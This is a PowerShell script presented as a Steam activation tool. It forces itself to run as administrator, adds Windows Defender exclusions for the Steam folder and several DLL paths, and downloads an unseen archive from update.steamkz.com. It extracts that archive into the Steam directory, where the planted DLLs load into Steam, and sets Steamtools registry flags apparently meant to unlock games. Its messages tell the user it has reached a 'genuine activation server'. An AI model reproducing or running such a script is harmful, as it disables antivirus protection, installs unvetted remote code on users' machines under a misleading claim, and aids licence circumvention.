cls
[Console]::InputEncoding = [System.Text.Encoding]::UTF8

Write-Host -NoNewline "          _____                _____                    _____                    _____                    _____          `r" -ForegroundColor:blue
Write-Host -NoNewline "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         `r" -ForegroundColor:blue
Write-Host -NoNewline "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        `r" -ForegroundColor:blue
Write-Host -NoNewline "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  `r" -ForegroundColor:blue
Write-Host -NoNewline " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ `r" -ForegroundColor:blue
Write-Host -NoNewline "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\`r" -ForegroundColor:blue
Write-Host -NoNewline "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /`r" -ForegroundColor:blue
Write-Host -NoNewline " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / `r" -ForegroundColor:blue
Write-Host -NoNewline "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  `r" -ForegroundColor:blue
Write-Host -NoNewline "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    `r" -ForegroundColor:blue
Write-Host -NoNewline "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     `r" -ForegroundColor:blue
Write-Host -NoNewline "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      `r" -ForegroundColor:blue
Write-Host -NoNewline "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       `r" -ForegroundColor:blue
Write-Host -NoNewline "        \::/    /                                     \::/    /                \::/    /                \::/    /        `r" -ForegroundColor:blue
Write-Host -NoNewline "         \/____/                                       \/____/                  \/____/                  \/____/         `r" -ForegroundColor:blue

$localPath = Join-Path $env:LOCALAPPDATA "steam"
$steamRegPath = 'HKCU:\Software\Valve\Steam'
$steamToolsRegPath = 'HKCU:\Software\Valve\Steamtools'
$steamPath = ""

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        if ($PSCommandPath) {
            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        } else {
            $scriptText = $MyInvocation.MyCommand.Definition
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptText))
            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded"
        }
    } catch {
        Write-Host "[需要管理员权限才能继续，请右键以管理员身份运行]" -ForegroundColor Red
        Start-Sleep 5
    }
    exit
}

function Remove-ItemIfExists($path) {
    if (Test-Path $path) {
        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
    }
}
Write-Host "正在网络初始化中..." -ForegroundColor Cyan

function Optimize-NetworkSettings {
    try {
        $protocols = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
        try { $protocols = $protocols -bor [Net.SecurityProtocolType]::Tls13 } catch {}
        [Net.ServicePointManager]::SecurityProtocol = $protocols
    } catch {}
    try { [Net.ServicePointManager]::Expect100Continue = $false } catch {}
    try { [Net.ServicePointManager]::DefaultConnectionLimit = 512 } catch {}
    try { [Net.ServicePointManager]::UseNagleAlgorithm = $false } catch {}
}

function Download-ViaHttpWebRequest($url, $targetPath) {
    $response = $null; $responseStream = $null; $fileStream = $null
    try {
        $request = [System.Net.HttpWebRequest]::Create($url)
        $request.UserAgent = "Mozilla/5.0"
        $request.AllowAutoRedirect = $true
        $request.Timeout = 30000
        $request.ReadWriteTimeout = 120000
        $request.KeepAlive = $true
        try { $request.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate } catch {}
        try { $request.ServicePoint.ConnectionLimit = 512 } catch {}
        try { $request.ServicePoint.UseNagleAlgorithm = $false } catch {}
        try { $request.ServicePoint.Expect100Continue = $false } catch {}
        $response = $request.GetResponse()
        $responseStream = $response.GetResponseStream()
        $fileStream = New-Object System.IO.FileStream($targetPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None, 4194304)
        $buffer = New-Object byte[] 4194304
        while (($read = $responseStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $fileStream.Write($buffer, 0, $read)
        }
        $fileStream.Flush()
        return $true
    } catch {
        return $false
    } finally {
        if ($fileStream) { $fileStream.Close() }
        if ($responseStream) { $responseStream.Close() }
        if ($response) { $response.Close() }
    }
}

function Download-ViaBits($url, $targetPath) {
    try {
        if (Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) {
            Start-BitsTransfer -Source $url -Destination $targetPath -Priority Foreground -ErrorAction Stop
            return (Test-Path $targetPath)
        }
    } catch {}
    return $false
}

function Download-ViaWebClient($url, $targetPath) {
    $wc = $null
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $targetPath)
        return (Test-Path $targetPath)
    } catch {
        return $false
    } finally {
        if ($wc) { $wc.Dispose() }
    }
}

function Get-FileFast($url, $targetPath) {
    Remove-ItemIfExists $targetPath
    try { Add-MpPreference -ExclusionPath $targetPath -ErrorAction SilentlyContinue } catch {}
    Optimize-NetworkSettings
    $ProgressPreference = 'SilentlyContinue'

    foreach ($method in @('Download-ViaHttpWebRequest', 'Download-ViaBits', 'Download-ViaWebClient')) {
        Remove-ItemIfExists $targetPath
        $ok = & $method $url $targetPath
        if ($ok -and (Test-Path $targetPath) -and ((Get-Item $targetPath).Length -gt 0)) {
            return $true
        }
    }
    Remove-ItemIfExists $targetPath
    return $false
}

function Expand-ZipTo($zipPath, $destination) {
    if (!(Test-Path $destination)) {
        New-Item -Path $destination -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    }

    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
        $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
        try {
            foreach ($entry in $zip.Entries) {
                $targetFile = Join-Path $destination $entry.FullName
                if ([string]::IsNullOrEmpty($entry.Name)) {
                    if (!(Test-Path $targetFile)) { New-Item -Path $targetFile -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
                    continue
                }
                $targetDir = Split-Path $targetFile -Parent
                if (!(Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null }
                try {
                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $targetFile, $true)
                } catch {
                    try { Move-Item -Path $targetFile -Destination "$targetFile.old" -Force -ErrorAction SilentlyContinue } catch {}
                    try { [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $targetFile, $true) } catch {}
                }
            }
            return $true
        } finally {
            $zip.Dispose()
        }
    } catch {}

    try {
        if (Get-Command Expand-Archive -ErrorAction SilentlyContinue) {
            Expand-Archive -Path $zipPath -DestinationPath $destination -Force -ErrorAction Stop
            return $true
        }
    } catch {}

    try {
        $shell = New-Object -ComObject Shell.Application
        $zipNs = $shell.NameSpace($zipPath)
        $destNs = $shell.NameSpace($destination)
        if ($zipNs -and $destNs) {
            $destNs.CopyHere($zipNs.Items(), 0x10 -bor 0x4 -bor 0x400)
            Start-Sleep -Seconds 2
            return $true
        }
    } catch {}

    return $false
}

function ForceStopProcess($processName) {
    Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2 
    if (Get-Process $processName -ErrorAction SilentlyContinue) {
        Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}

function CheckAndPromptProcess($processName, $message) {
    while (Get-Process $processName -ErrorAction SilentlyContinue) {
        Write-Host $message -ForegroundColor Red
        Start-Sleep 1.5
    }
}

$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
Remove-ItemIfExists $filePathToDelete

ForceStopProcess "steam"
if (Get-Process "steam" -ErrorAction SilentlyContinue) {
    CheckAndPromptProcess "Steam" "[请先退出 Steam 客户端]"
}

if (Test-Path $steamRegPath) {
    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
        $steamPath = $properties.SteamPath
    }
}
if ([string]::IsNullOrWhiteSpace($steamPath)) {
    Write-Host "您的电脑没有安装官方正版 Steam 客户端，请安装后再次尝试。" -ForegroundColor Red
    Start-Sleep 10
    exit
}

if (-not (Test-Path $steamPath -PathType Container)) {
    Write-Host "您的电脑没有安装官方正版 Steam 客户端，请安装后再次尝试。" -ForegroundColor Red
    Start-Sleep 10
    exit
}

$steamConfigPath = Join-Path $steamPath "config"
$hidPath = Join-Path $steamPath "xinput1_4.dll"

$xinputPath = Join-Path $steamPath "user32.dll"
Remove-ItemIfExists $xinputPath

function PwStart() {
    try {
        if (!$steamPath) {
            return
        }
        if (!(Test-Path $localPath)) {
            New-Item $localPath -ItemType directory -Force -ErrorAction SilentlyContinue
        }
        
        $hidDllPath = Join-Path $steamPath "hid.dll"
        Remove-ItemIfExists $hidDllPath
        
        $steamCfgFilePath = Join-Path $steamPath "steam.cfg"
        Remove-ItemIfExists $steamCfgFilePath
        
        $steamBetaPath = Join-Path $steamPath "package\beta"
        Remove-ItemIfExists $steamBetaPath
        
        $catchPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
        Remove-ItemIfExists $catchPath
        try { Add-MpPreference -ExclusionPath $hidPath -ErrorAction SilentlyContinue } catch {}
        try { Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue } catch {}

        $versionDllPath = Join-Path $steamPath "version.dll"
        Remove-ItemIfExists $versionDllPath

        $dwmapiPath = Join-Path $steamPath "dwmapi.dll"
        try { Add-MpPreference -ExclusionPath $dwmapiPath -ErrorAction SilentlyContinue } catch {}

        $resUrl = "http://update.steamkz.com/res.zip"
        $zipPath = Join-Path $env:TEMP "res.zip"
        Remove-ItemIfExists $zipPath
        try { Add-MpPreference -ExclusionPath $zipPath -ErrorAction SilentlyContinue } catch {}

        $downloadOk = Get-FileFast $resUrl $zipPath
        if ((-not $downloadOk) -or (-not (Test-Path $zipPath)) -or ((Get-Item $zipPath).Length -eq 0)) {
            Remove-ItemIfExists $zipPath
            Write-Host "[网络获取文件失败，请检查网络后重试]" -ForegroundColor Red
            Start-Sleep 10
            return
        }

        $extractOk = Expand-ZipTo $zipPath $steamPath
        Remove-ItemIfExists $zipPath
        if (-not $extractOk) {
            Write-Host "[资源解压失败，请重试]" -ForegroundColor Red
            Start-Sleep 10
            return
        }
        
        if (!(Test-Path $steamToolsRegPath)) {
            New-Item -Path $steamToolsRegPath -Force | Out-Null
        }
        
        Remove-ItemProperty -Path $steamToolsRegPath -Name "ActivateUnlockMode" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $steamToolsRegPath -Name "AlwaysStayUnlocked" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $steamToolsRegPath -Name "notUnlockDepot" -ErrorAction SilentlyContinue
        
        Set-ItemProperty -Path $steamToolsRegPath -Name "iscdkey" -Value "true" -Type String
        
        $steamExePath = Join-Path $steamPath "steam.exe"
        $launched = $false
        try {
            if (Test-Path $steamExePath) {
                Start-Process explorer.exe -ArgumentList "`"$steamExePath`"" -ErrorAction Stop
                $launched = $true
            }
        } catch {}
        if (-not $launched) {
            try {
                if (Test-Path $steamExePath) {
                    Start-Process $steamExePath -ErrorAction Stop
                    $launched = $true
                }
            } catch {}
        }
        if (-not $launched) {
            try {
                Start-Process "steam://" -ErrorAction Stop
                $launched = $true
            } catch {}
        }
        Write-Host "[已成功连接正版激活服务器，请登录Steam来激活]" -ForegroundColor Green

        for ($i = 5; $i -ge 0; $i--) {
            Write-Host "`r[本窗口将在 $i 秒后关闭...]" -NoNewline
            Start-Sleep -Seconds 1
        }
        
        $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'"
        while ($null -ne $instance -and -not($instance.ProcessName -ne "powershell.exe" -and $instance.ProcessName -ne "WindowsTerminal.exe")) {
            $parentProcessId = $instance.ProcessId
            $instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$($instance.ParentProcessId)'"
        }
        if ($null -ne $parentProcessId) {
            Stop-Process -Id $parentProcessId -Force -ErrorAction SilentlyContinue
        }
        
        exit
        
    } catch {
        Write-Host "[执行出错] $($_.Exception.Message)" -ForegroundColor Red
        Start-Sleep 10
    }
}

PwStart
